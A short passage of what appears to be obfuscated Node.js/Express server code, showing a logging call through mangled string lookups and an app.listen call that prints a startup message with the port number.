_0x3a68d6=_0x33c20a;console[_0x3a68d6(0xfc)](_0x3a68d6(0x182),_0x2f1d6e);}),app['listen'](PORT,()=>console['log'](_0x33c20a(0x146)+PORT+'!'));
